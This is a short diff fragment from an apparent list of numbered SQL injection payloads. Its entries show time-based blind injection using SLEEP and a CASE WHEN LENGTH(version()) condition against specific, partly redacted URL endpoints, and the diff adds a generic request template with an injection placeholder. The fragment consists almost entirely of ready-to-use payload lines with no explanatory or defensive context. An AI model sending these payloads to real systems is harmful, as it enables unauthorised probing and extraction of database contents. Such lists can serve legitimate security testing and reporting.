@@ -95,3 +95,10 @@ https://███/hro/html/tech.cfm?Sort=SLEEP(25)&ThisType=3
 7)
 
 :/php/widgets_handler.php?method=getResWidgetButton&res_id=51-CASE/**/WHEN(LENGTH(​version()​)=​10​)THEN(SLEEP(6*1))END
+
+8)
+
+GET /vulnurl HTTP/1.1
+Host: host
+
+list[2{injection here}]=signup
